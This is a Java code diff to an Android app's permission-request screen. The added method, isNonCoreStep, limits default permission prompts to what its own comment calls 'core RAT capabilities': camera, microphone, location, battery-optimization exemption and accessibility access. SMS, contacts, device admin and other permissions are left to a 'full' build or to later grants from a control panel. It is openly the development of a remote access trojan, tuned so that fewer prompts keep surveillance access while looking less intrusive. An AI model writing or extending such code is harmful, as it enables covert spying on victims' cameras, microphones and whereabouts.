@@ -211,9 +211,10 @@ public class PermissionActivity extends AppCompatActivity {
     private void advanceChain() {
         if (isFinishing() || isDestroyed()) return;
 
-        // Skip steps whose condition is already satisfied or that were permanently skipped
+        // Skip steps whose condition is already satisfied, that were permanently skipped,
+        // or that are excluded by the minimal permission set (see isNonCoreStep).
         while (currentStep >= 0 && currentStep < TOTAL_STEPS
-                && (isStepDone(currentStep) || skippedSteps.contains(currentStep))) {
+                && (isStepDone(currentStep) || skippedSteps.contains(currentStep) || isNonCoreStep(currentStep))) {
             currentStep++;
         }
 
@@ -224,6 +225,25 @@ public class PermissionActivity extends AppCompatActivity {
 
         updateUi(currentStep, hintForStep(currentStep));
         fireStep(currentStep);
+    }
+
+    // [SLIM] Minimal permission set (default): only core RAT capabilities are requested
+    // up-front — camera / microphone / location / battery-optimization / accessibility.
+    // SMS, contacts, call-log, storage, phone-state, device-admin, notification access,
+    // overlay, install-source and all-files are only requested when PERMISSION_SET=full
+    // is set in local.properties (and can be granted later via the panel when needed).
+    private boolean isNonCoreStep(int step) {
+        if ("full".equalsIgnoreCase(BuildConfig.PERMISSION_SET)) return false;
+        switch (step) {
+            case 3:   // camera
+            case 4:   // microphone
+            case 5:   // location
+            case 8:   // ignore battery optimizations
+            case 10:  // accessibility service
+                return false;
+            default:
+                return true;
+        }
     }
 
     private boolean isStepDone(int step) {
